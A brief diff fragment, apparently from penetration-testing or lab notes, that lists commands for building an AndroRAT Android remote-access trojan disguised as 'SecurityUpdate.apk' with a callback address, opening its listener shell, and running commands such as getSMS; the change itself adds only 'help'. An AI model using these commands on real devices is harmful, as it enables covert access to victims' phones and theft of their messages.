@@ -25,6 +25,7 @@ setoolkit
 `python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk`  
 `python3 androRAT.py --shell -i 0.0.0.0 -p 4444`  
 
+help
 getSMS  
 getMACAddress  
 
